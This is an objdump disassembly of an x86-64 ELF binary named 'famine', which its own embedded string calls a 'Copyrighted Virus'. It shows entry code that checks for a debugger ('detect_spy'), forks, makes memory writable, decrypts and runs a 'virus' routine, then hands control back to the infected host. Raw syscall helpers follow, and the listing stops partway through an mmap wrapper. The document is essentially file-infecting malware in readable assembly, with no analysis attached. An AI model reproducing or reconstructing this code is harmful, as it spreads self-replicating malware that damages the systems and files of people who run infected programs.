
/tmp/test/famine:     file format elf64-x86-64


Disassembly of section .interp:

0000000000000270 <.interp>:
 270:	2f                   	(bad)  
 271:	6c                   	insb   (%dx),%es:(%rdi)
 272:	69 62 36 34 2f 6c 64 	imul   $0x646c2f34,0x36(%rdx),%esp
 279:	2d 6c 69 6e 75       	sub    $0x756e696c,%eax
 27e:	78 2d                	js     2ad <famine_entry-0xd53>
 280:	78 38                	js     2ba <famine_entry-0xd46>
 282:	36 2d 36 34 2e 73    	ss sub $0x732e3436,%eax
 288:	6f                   	outsl  %ds:(%rsi),(%dx)
 289:	2e 32 00             	xor    %cs:(%rax),%al

Disassembly of section .hash:

0000000000000290 <.hash>:
 290:	01 00                	add    %eax,(%rax)
 292:	00 00                	add    %al,(%rax)
 294:	01 00                	add    %eax,(%rax)
	...

Disassembly of section .gnu.hash:

00000000000002a0 <.gnu.hash>:
 2a0:	01 00                	add    %eax,(%rax)
 2a2:	00 00                	add    %al,(%rax)
 2a4:	01 00                	add    %eax,(%rax)
 2a6:	00 00                	add    %al,(%rax)
 2a8:	01 00                	add    %eax,(%rax)
	...

Disassembly of section .dynsym:

00000000000002c0 <.dynsym>:
	...

Disassembly of section .dynstr:

00000000000002d8 <.dynstr>:
	...

Disassembly of section .text:

0000000000001000 <famine_entry>:
    1000:	e8 78 00 00 00       	callq  107d <mark_below>
    1005:	31 32                	xor    %esi,(%rdx)
    1007:	38 20                	cmp    %ah,(%rax)
    1009:	62                   	(bad)  
    100a:	69 74 20 6b 65 79 20 	imul   $0x68207965,0x6b(%rax,%riz,1),%esi
    1011:	68 
    1012:	65 72 65             	gs jb  107a <famine_entry+0x7a>
    1015:	72 65                	jb     107c <famine_entry+0x7c>
    1017:	6c                   	insb   (%dx),%es:(%rdi)
    1018:	20 70 74             	and    %dh,0x74(%rax)
    101b:	6c                   	insb   (%dx),%es:(%rdi)
    101c:	64 70 74             	fs jo  1093 <mark_below+0x16>
    101f:	6c                   	insb   (%dx),%es:(%rdi)
    1020:	64 73 69             	fs jae 108c <mark_below+0xf>
    1023:	7a 65                	jp     108a <mark_below+0xd>
    1025:	72 65                	jb     108c <mark_below+0xf>
    1027:	6c                   	insb   (%dx),%es:(%rdi)
    1028:	76 69                	jbe    1093 <mark_below+0x16>
    102a:	72 75                	jb     10a1 <mark_below+0x24>
    102c:	73 72                	jae    10a0 <mark_below+0x23>
    102e:	65 6c                	gs insb (%dx),%es:(%rdi)
    1030:	65 6e                	outsb  %gs:(%rsi),(%dx)
    1032:	74 72                	je     10a6 <mark_below+0x29>
    1034:	79 76                	jns    10ac <mark_below+0x2f>
    1036:	69 72 75 73 69 7a 65 	imul   $0x657a6973,0x75(%rdx),%esi
    103d:	57                   	push   %rdi
    103e:	61                   	(bad)  
    103f:	72 6e                	jb     10af <mark_below+0x32>
    1041:	69 6e 67 20 3a 20 43 	imul   $0x43203a20,0x67(%rsi),%ebp
    1048:	6f                   	outsl  %ds:(%rsi),(%dx)
    1049:	70 79                	jo     10c4 <mark_below+0x47>
    104b:	72 69                	jb     10b6 <mark_below+0x39>
    104d:	67 68 74 65 64 20    	addr32 pushq $0x20646574
    1053:	56                   	push   %rsi
    1054:	69 72 75 73 20 62 79 	imul   $0x79622073,0x75(%rdx),%esi
    105b:	20 5f 5f             	and    %bl,0x5f(%rdi)
    105e:	55                   	push   %rbp
    105f:	4e                   	rex.WRX
    1060:	49                   	rex.WB
    1061:	43                   	rex.XB
    1062:	4f 52                	rex.WRXB push %r10
    1064:	4e 53                	rex.WRX push %rbx
    1066:	5f                   	pop    %rdi
    1067:	4f                   	rex.WRXB
    1068:	46 5f                	rex.RX pop %rdi
    106a:	54                   	push   %rsp
    106b:	48                   	rex.W
    106c:	45 5f                	rex.RB pop %r15
    106e:	41 50                	push   %r8
    1070:	4f                   	rex.WRXB
    1071:	43                   	rex.XB
    1072:	41                   	rex.B
    1073:	4c 59                	rex.WR pop %rcx
    1075:	50                   	push   %rax
    1076:	53                   	push   %rbx
    1077:	45 5f                	rex.RB pop %r15
    1079:	5f                   	pop    %rdi
    107a:	20 3c 33             	and    %bh,(%rbx,%rsi,1)

000000000000107d <mark_below>:
    107d:	58                   	pop    %rax
    107e:	52                   	push   %rdx
    107f:	41 56                	push   %r14
    1081:	48 89 c2             	mov    %rax,%rdx
    1084:	49 89 d0             	mov    %rdx,%r8
    1087:	49 89 d1             	mov    %rdx,%r9
    108a:	49 89 d2             	mov    %rdx,%r10
    108d:	49 89 d3             	mov    %rdx,%r11
    1090:	49 89 d6             	mov    %rdx,%r14
    1093:	49 83 c0 10          	add    $0x10,%r8
    1097:	49 83 c1 18          	add    $0x18,%r9
    109b:	49 83 c2 20          	add    $0x20,%r10
    109f:	49 83 c3 28          	add    $0x28,%r11
    10a3:	49 83 c6 30          	add    $0x30,%r14
    10a7:	4d 8b 00             	mov    (%r8),%r8
    10aa:	4d 8b 09             	mov    (%r9),%r9
    10ad:	4d 8b 12             	mov    (%r10),%r10
    10b0:	4d 8b 1b             	mov    (%r11),%r11
    10b3:	4d 8b 36             	mov    (%r14),%r14
    10b6:	48 89 d0             	mov    %rdx,%rax
    10b9:	48 83 e8 05          	sub    $0x5,%rax
    10bd:	41 57                	push   %r15
    10bf:	49 89 c7             	mov    %rax,%r15
    10c2:	4d 87 f8             	xchg   %r15,%r8
    10c5:	4d 29 f8             	sub    %r15,%r8
    10c8:	49 89 c7             	mov    %rax,%r15
    10cb:	4d 87 fa             	xchg   %r15,%r10
    10ce:	4d 01 fa             	add    %r15,%r10
    10d1:	49 89 c7             	mov    %rax,%r15
    10d4:	4d 87 fb             	xchg   %r15,%r11
    10d7:	4d 29 fb             	sub    %r15,%r11
    10da:	41 5f                	pop    %r15
    10dc:	50                   	push   %rax
    10dd:	41 50                	push   %r8
    10df:	41 51                	push   %r9
    10e1:	41 52                	push   %r10
    10e3:	41 53                	push   %r11
    10e5:	52                   	push   %rdx
    10e6:	e8 45 06 00 00       	callq  1730 <detect_spy>
    10eb:	48 85 c0             	test   %rax,%rax
    10ee:	75 62                	jne    1152 <return_to_client>
    10f0:	b8 39 00 00 00       	mov    $0x39,%eax
    10f5:	0f 05                	syscall 
    10f7:	48 85 c0             	test   %rax,%rax
    10fa:	75 56                	jne    1152 <return_to_client>
    10fc:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
    1101:	4c 8b 4c 24 18       	mov    0x18(%rsp),%r9
    1106:	4c 89 c7             	mov    %r8,%rdi
    1109:	4c 89 ce             	mov    %r9,%rsi
    110c:	ba 07 00 00 00       	mov    $0x7,%edx
    1111:	b8 0a 00 00 00       	mov    $0xa,%eax
    1116:	0f 05                	syscall 
    1118:	48 8b 14 24          	mov    (%rsp),%rdx
    111c:	4c 8b 54 24 10       	mov    0x10(%rsp),%r10
    1121:	4c 89 f0             	mov    %r14,%rax
    1124:	bf 20 00 00 00       	mov    $0x20,%edi
    1129:	4c 89 d6             	mov    %r10,%rsi
    112c:	48 89 d2             	mov    %rdx,%rdx
    112f:	48 89 c1             	mov    %rax,%rcx
    1132:	e8 99 09 00 00       	callq  1ad0 <decrypt>
    1137:	48 89 d7             	mov    %rdx,%rdi
    113a:	e8 61 0a 00 00       	callq  1ba0 <virus>
    113f:	48 83 c4 30          	add    $0x30,%rsp
    1143:	41 5e                	pop    %r14
    1145:	5a                   	pop    %rdx
    1146:	bf 00 00 00 00       	mov    $0x0,%edi
    114b:	b8 3c 00 00 00       	mov    $0x3c,%eax
    1150:	0f 05                	syscall 

0000000000001152 <return_to_client>:
    1152:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
    1157:	48 83 c4 30          	add    $0x30,%rsp
    115b:	41 5e                	pop    %r14
    115d:	5a                   	pop    %rdx
    115e:	41 53                	push   %r11
    1160:	c3                   	retq   
    1161:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    1168:	00 00 00 
    116b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000001170 <ft_getrandom>:
    1170:	55                   	push   %rbp
    1171:	48 89 e5             	mov    %rsp,%rbp
    1174:	48 83 ec 40          	sub    $0x40,%rsp
    1178:	31 c0                	xor    %eax,%eax
    117a:	48 8d 4d d3          	lea    -0x2d(%rbp),%rcx
    117e:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
    1182:	48 89 75 e8          	mov    %rsi,-0x18(%rbp)
    1186:	c6 45 d3 2f          	movb   $0x2f,-0x2d(%rbp)
    118a:	c6 45 d4 64          	movb   $0x64,-0x2c(%rbp)
    118e:	c6 45 d5 65          	movb   $0x65,-0x2b(%rbp)
    1192:	c6 45 d6 76          	movb   $0x76,-0x2a(%rbp)
    1196:	c6 45 d7 2f          	movb   $0x2f,-0x29(%rbp)
    119a:	c6 45 d8 75          	movb   $0x75,-0x28(%rbp)
    119e:	c6 45 d9 72          	movb   $0x72,-0x27(%rbp)
    11a2:	c6 45 da 61          	movb   $0x61,-0x26(%rbp)
    11a6:	c6 45 db 6e          	movb   $0x6e,-0x25(%rbp)
    11aa:	c6 45 dc 64          	movb   $0x64,-0x24(%rbp)
    11ae:	c6 45 dd 6f          	movb   $0x6f,-0x23(%rbp)
    11b2:	c6 45 de 6d          	movb   $0x6d,-0x22(%rbp)
    11b6:	c6 45 df 00          	movb   $0x0,-0x21(%rbp)
    11ba:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
    11be:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
    11c2:	89 c6                	mov    %eax,%esi
    11c4:	b0 00                	mov    $0x0,%al
    11c6:	e8 35 04 00 00       	callq  1600 <famine_open>
    11cb:	89 45 cc             	mov    %eax,-0x34(%rbp)
    11ce:	83 7d cc 00          	cmpl   $0x0,-0x34(%rbp)
    11d2:	0f 8d 0d 00 00 00    	jge    11e5 <ft_getrandom+0x75>
    11d8:	48 c7 45 f8 2a 00 00 	movq   $0x2a,-0x8(%rbp)
    11df:	00 
    11e0:	e9 27 00 00 00       	jmpq   120c <ft_getrandom+0x9c>
    11e5:	8b 7d cc             	mov    -0x34(%rbp),%edi
    11e8:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
    11ec:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    11f0:	48 89 c6             	mov    %rax,%rsi
    11f3:	e8 c8 03 00 00       	callq  15c0 <famine_read>
    11f8:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    11fc:	8b 7d cc             	mov    -0x34(%rbp),%edi
    11ff:	e8 1c 04 00 00       	callq  1620 <famine_close>
    1204:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
    1208:	48 89 4d f8          	mov    %rcx,-0x8(%rbp)
    120c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1210:	48 83 c4 40          	add    $0x40,%rsp
    1214:	5d                   	pop    %rbp
    1215:	c3                   	retq   
    1216:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    121d:	00 00 00 

0000000000001220 <ft_bzero>:
    1220:	55                   	push   %rbp
    1221:	48 89 e5             	mov    %rsp,%rbp
    1224:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1228:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    122c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1230:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    1234:	48 c7 45 e0 00 00 00 	movq   $0x0,-0x20(%rbp)
    123b:	00 
    123c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1240:	48 3b 45 f0          	cmp    -0x10(%rbp),%rax
    1244:	0f 83 1f 00 00 00    	jae    1269 <ft_bzero+0x49>
    124a:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    124e:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
    1252:	c6 04 08 00          	movb   $0x0,(%rax,%rcx,1)
    1256:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    125a:	48 05 01 00 00 00    	add    $0x1,%rax
    1260:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    1264:	e9 d3 ff ff ff       	jmpq   123c <ft_bzero+0x1c>
    1269:	5d                   	pop    %rbp
    126a:	c3                   	retq   
    126b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000001270 <ft_memcmp>:
    1270:	55                   	push   %rbp
    1271:	48 89 e5             	mov    %rsp,%rbp
    1274:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
    1278:	48 89 75 e8          	mov    %rsi,-0x18(%rbp)
    127c:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
    1280:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1284:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    1288:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    128c:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    1290:	48 c7 45 d8 00 00 00 	movq   $0x0,-0x28(%rbp)
    1297:	00 
    1298:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    129c:	48 3b 45 e0          	cmp    -0x20(%rbp),%rax
    12a0:	0f 83 55 00 00 00    	jae    12fb <ft_memcmp+0x8b>
    12a6:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    12aa:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    12ae:	0f b6 14 08          	movzbl (%rax,%rcx,1),%edx
    12b2:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    12b6:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    12ba:	0f b6 34 08          	movzbl (%rax,%rcx,1),%esi
    12be:	39 f2                	cmp    %esi,%edx
    12c0:	0f 84 22 00 00 00    	je     12e8 <ft_memcmp+0x78>
    12c6:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    12ca:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    12ce:	0f b6 14 08          	movzbl (%rax,%rcx,1),%edx
    12d2:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    12d6:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    12da:	0f b6 34 08          	movzbl (%rax,%rcx,1),%esi
    12de:	29 f2                	sub    %esi,%edx
    12e0:	89 55 fc             	mov    %edx,-0x4(%rbp)
    12e3:	e9 1a 00 00 00       	jmpq   1302 <ft_memcmp+0x92>
    12e8:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    12ec:	48 05 01 00 00 00    	add    $0x1,%rax
    12f2:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    12f6:	e9 9d ff ff ff       	jmpq   1298 <ft_memcmp+0x28>
    12fb:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
    1302:	8b 45 fc             	mov    -0x4(%rbp),%eax
    1305:	5d                   	pop    %rbp
    1306:	c3                   	retq   
    1307:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    130e:	00 00 

0000000000001310 <ft_strlen>:
    1310:	55                   	push   %rbp
    1311:	48 89 e5             	mov    %rsp,%rbp
    1314:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1318:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    131c:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    1320:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1324:	80 38 00             	cmpb   $0x0,(%rax)
    1327:	0f 84 13 00 00 00    	je     1340 <ft_strlen+0x30>
    132d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1331:	48 05 01 00 00 00    	add    $0x1,%rax
    1337:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    133b:	e9 e0 ff ff ff       	jmpq   1320 <ft_strlen+0x10>
    1340:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1344:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
    1348:	48 29 c8             	sub    %rcx,%rax
    134b:	5d                   	pop    %rbp
    134c:	c3                   	retq   
    134d:	0f 1f 00             	nopl   (%rax)

0000000000001350 <ft_memcpy>:
    1350:	55                   	push   %rbp
    1351:	48 89 e5             	mov    %rsp,%rbp
    1354:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1358:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    135c:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
    1360:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1364:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    1368:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    136c:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    1370:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1374:	48 89 c1             	mov    %rax,%rcx
    1377:	48 81 c1 ff ff ff ff 	add    $0xffffffffffffffff,%rcx
    137e:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
    1382:	48 83 f8 00          	cmp    $0x0,%rax
    1386:	0f 84 2d 00 00 00    	je     13b9 <ft_memcpy+0x69>
    138c:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1390:	8a 08                	mov    (%rax),%cl
    1392:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1396:	88 08                	mov    %cl,(%rax)
    1398:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    139c:	48 05 01 00 00 00    	add    $0x1,%rax
    13a2:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    13a6:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    13aa:	48 05 01 00 00 00    	add    $0x1,%rax
    13b0:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    13b4:	e9 b7 ff ff ff       	jmpq   1370 <ft_memcpy+0x20>
    13b9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    13bd:	5d                   	pop    %rbp
    13be:	c3                   	retq   
    13bf:	90                   	nop

00000000000013c0 <ft_strcpy>:
    13c0:	55                   	push   %rbp
    13c1:	48 89 e5             	mov    %rsp,%rbp
    13c4:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    13c8:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    13cc:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
    13d3:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    13d7:	48 63 4d ec          	movslq -0x14(%rbp),%rcx
    13db:	80 3c 08 00          	cmpb   $0x0,(%rax,%rcx,1)
    13df:	0f 84 24 00 00 00    	je     1409 <ft_strcpy+0x49>
    13e5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    13e9:	48 63 4d ec          	movslq -0x14(%rbp),%rcx
    13ed:	8a 14 08             	mov    (%rax,%rcx,1),%dl
    13f0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    13f4:	48 63 4d ec          	movslq -0x14(%rbp),%rcx
    13f8:	88 14 08             	mov    %dl,(%rax,%rcx,1)
    13fb:	8b 75 ec             	mov    -0x14(%rbp),%esi
    13fe:	83 c6 01             	add    $0x1,%esi
    1401:	89 75 ec             	mov    %esi,-0x14(%rbp)
    1404:	e9 ca ff ff ff       	jmpq   13d3 <ft_strcpy+0x13>
    1409:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    140d:	48 63 4d ec          	movslq -0x14(%rbp),%rcx
    1411:	c6 04 08 00          	movb   $0x0,(%rax,%rcx,1)
    1415:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1419:	5d                   	pop    %rbp
    141a:	c3                   	retq   
    141b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000001420 <ft_strcat>:
    1420:	55                   	push   %rbp
    1421:	48 89 e5             	mov    %rsp,%rbp
    1424:	48 83 ec 20          	sub    $0x20,%rsp
    1428:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    142c:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    1430:	48 8b 7d f8          	mov    -0x8(%rbp),%rdi
    1434:	e8 d7 fe ff ff       	callq  1310 <ft_strlen>
    1439:	89 45 ec             	mov    %eax,-0x14(%rbp)
    143c:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
    1440:	48 63 55 ec          	movslq -0x14(%rbp),%rdx
    1444:	48 01 d1             	add    %rdx,%rcx
    1447:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    144b:	48 89 cf             	mov    %rcx,%rdi
    144e:	e8 6d ff ff ff       	callq  13c0 <ft_strcpy>
    1453:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
    1457:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    145b:	48 89 c8             	mov    %rcx,%rax
    145e:	48 83 c4 20          	add    $0x20,%rsp
    1462:	5d                   	pop    %rbp
    1463:	c3                   	retq   
    1464:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    146b:	00 00 00 
    146e:	66 90                	xchg   %ax,%ax

0000000000001470 <dprintf>:
    1470:	55                   	push   %rbp
    1471:	48 89 e5             	mov    %rsp,%rbp
    1474:	48 83 ec 20          	sub    $0x20,%rsp
    1478:	89 7d fc             	mov    %edi,-0x4(%rbp)
    147b:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    147f:	8b 7d fc             	mov    -0x4(%rbp),%edi
    1482:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1486:	89 7d ec             	mov    %edi,-0x14(%rbp)
    1489:	48 89 c7             	mov    %rax,%rdi
    148c:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    1490:	e8 7b fe ff ff       	callq  1310 <ft_strlen>
    1495:	8b 7d ec             	mov    -0x14(%rbp),%edi
    1498:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
    149c:	48 89 c2             	mov    %rax,%rdx
    149f:	e8 3c 01 00 00       	callq  15e0 <famine_write>
    14a4:	48 83 c4 20          	add    $0x20,%rsp
    14a8:	5d                   	pop    %rbp
    14a9:	c3                   	retq   
    14aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000000000014b0 <ft_strstr>:
    14b0:	55                   	push   %rbp
    14b1:	48 89 e5             	mov    %rsp,%rbp
    14b4:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
    14b8:	48 89 75 e8          	mov    %rsi,-0x18(%rbp)
    14bc:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
    14c3:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    14c7:	80 38 00             	cmpb   $0x0,(%rax)
    14ca:	0f 85 1a 00 00 00    	jne    14ea <ft_strstr+0x3a>
    14d0:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    14d4:	80 38 00             	cmpb   $0x0,(%rax)
    14d7:	0f 85 0d 00 00 00    	jne    14ea <ft_strstr+0x3a>
    14dd:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    14e1:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    14e5:	e9 c2 00 00 00       	jmpq   15ac <ft_strstr+0xfc>
    14ea:	e9 00 00 00 00       	jmpq   14ef <ft_strstr+0x3f>
    14ef:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    14f3:	8b 4d e4             	mov    -0x1c(%rbp),%ecx
    14f6:	89 ca                	mov    %ecx,%edx
    14f8:	80 3c 10 00          	cmpb   $0x0,(%rax,%rdx,1)
    14fc:	0f 84 a2 00 00 00    	je     15a4 <ft_strstr+0xf4>
    1502:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
    1509:	31 c0                	xor    %eax,%eax
    150b:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    150f:	8b 55 e4             	mov    -0x1c(%rbp),%edx
    1512:	03 55 e0             	add    -0x20(%rbp),%edx
    1515:	89 d2                	mov    %edx,%edx
    1517:	89 d6                	mov    %edx,%esi
    1519:	0f be 14 31          	movsbl (%rcx,%rsi,1),%edx
    151d:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
    1521:	8b 7d e0             	mov    -0x20(%rbp),%edi
    1524:	89 fe                	mov    %edi,%esi
    1526:	0f be 3c 31          	movsbl (%rcx,%rsi,1),%edi
    152a:	39 fa                	cmp    %edi,%edx
    152c:	88 45 df             	mov    %al,-0x21(%rbp)
    152f:	0f 85 18 00 00 00    	jne    154d <ft_strstr+0x9d>
    1535:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1539:	8b 4d e0             	mov    -0x20(%rbp),%ecx
    153c:	89 ca                	mov    %ecx,%edx
    153e:	0f be 0c 10          	movsbl (%rax,%rdx,1),%ecx
    1542:	83 f9 00             	cmp    $0x0,%ecx
    1545:	40 0f 95 c6          	setne  %sil
    1549:	40 88 75 df          	mov    %sil,-0x21(%rbp)
    154d:	8a 45 df             	mov    -0x21(%rbp),%al
    1550:	a8 01                	test   $0x1,%al
    1552:	0f 85 05 00 00 00    	jne    155d <ft_strstr+0xad>
    1558:	e9 0e 00 00 00       	jmpq   156b <ft_strstr+0xbb>
    155d:	8b 45 e0             	mov    -0x20(%rbp),%eax
    1560:	83 c0 01             	add    $0x1,%eax
    1563:	89 45 e0             	mov    %eax,-0x20(%rbp)
    1566:	e9 9e ff ff ff       	jmpq   1509 <ft_strstr+0x59>
    156b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    156f:	8b 4d e0             	mov    -0x20(%rbp),%ecx
    1572:	89 ca                	mov    %ecx,%edx
    1574:	0f be 0c 10          	movsbl (%rax,%rdx,1),%ecx
    1578:	83 f9 00             	cmp    $0x0,%ecx
    157b:	0f 85 15 00 00 00    	jne    1596 <ft_strstr+0xe6>
    1581:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1585:	8b 4d e4             	mov    -0x1c(%rbp),%ecx
    1588:	89 ca                	mov    %ecx,%edx
    158a:	48 01 d0             	add    %rdx,%rax
    158d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1591:	e9 16 00 00 00       	jmpq   15ac <ft_strstr+0xfc>
    1596:	8b 45 e4             	mov    -0x1c(%rbp),%eax
    1599:	83 c0 01             	add    $0x1,%eax
    159c:	89 45 e4             	mov    %eax,-0x1c(%rbp)
    159f:	e9 4b ff ff ff       	jmpq   14ef <ft_strstr+0x3f>
    15a4:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    15ab:	00 
    15ac:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    15b0:	5d                   	pop    %rbp
    15b1:	c3                   	retq   
    15b2:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    15b9:	00 00 00 
    15bc:	0f 1f 40 00          	nopl   0x0(%rax)

00000000000015c0 <famine_read>:
    15c0:	55                   	push   %rbp
    15c1:	48 89 e5             	mov    %rsp,%rbp
    15c4:	89 7d fc             	mov    %edi,-0x4(%rbp)
    15c7:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    15cb:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
    15cf:	49 89 ca             	mov    %rcx,%r10
    15d2:	48 c7 c0 00 00 00 00 	mov    $0x0,%rax
    15d9:	0f 05                	syscall 
    15db:	c9                   	leaveq 
    15dc:	c3                   	retq   
    15dd:	0f 1f 00             	nopl   (%rax)

00000000000015e0 <famine_write>:
    15e0:	55                   	push   %rbp
    15e1:	48 89 e5             	mov    %rsp,%rbp
    15e4:	89 7d fc             	mov    %edi,-0x4(%rbp)
    15e7:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    15eb:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
    15ef:	49 89 ca             	mov    %rcx,%r10
    15f2:	48 c7 c0 01 00 00 00 	mov    $0x1,%rax
    15f9:	0f 05                	syscall 
    15fb:	c9                   	leaveq 
    15fc:	c3                   	retq   
    15fd:	0f 1f 00             	nopl   (%rax)

0000000000001600 <famine_open>:
    1600:	55                   	push   %rbp
    1601:	48 89 e5             	mov    %rsp,%rbp
    1604:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1608:	89 75 f4             	mov    %esi,-0xc(%rbp)
    160b:	49 89 ca             	mov    %rcx,%r10
    160e:	48 c7 c0 02 00 00 00 	mov    $0x2,%rax
    1615:	0f 05                	syscall 
    1617:	c9                   	leaveq 
    1618:	c3                   	retq   
    1619:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001620 <famine_close>:
    1620:	55                   	push   %rbp
    1621:	48 89 e5             	mov    %rsp,%rbp
    1624:	89 7d fc             	mov    %edi,-0x4(%rbp)
    1627:	49 89 ca             	mov    %rcx,%r10
    162a:	48 c7 c0 03 00 00 00 	mov    $0x3,%rax
    1631:	0f 05                	syscall 
    1633:	c9                   	leaveq 
    1634:	c3                   	retq   
    1635:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    163c:	00 00 00 
    163f:	90                   	nop

0000000000001640 <famine_fstat>:
    1640:	55                   	push   %rbp
    1641:	48 89 e5             	mov    %rsp,%rbp
    1644:	89 7d fc             	mov    %edi,-0x4(%rbp)
    1647:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    164b:	49 89 ca             	mov    %rcx,%r10
    164e:	48 c7 c0 05 00 00 00 	mov    $0x5,%rax
    1655:	0f 05                	syscall 
    1657:	c9                   	leaveq 
    1658:	c3                   	retq   
    1659:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001660 <famine_mmap>:
    1660:	55                   	push   %rbp
    1661:	48 89 e5             	mov    %rsp,%rbp
    1664:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1668:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    166c:	89 55 ec             	mov    %edx,-0x14(%rbp)
    166f:	89 4d e8             	mov    %ecx,-0x18(%rbp)
    1672:	44 89 45 e4          	mov    %r8d,-0x1c(%rbp)
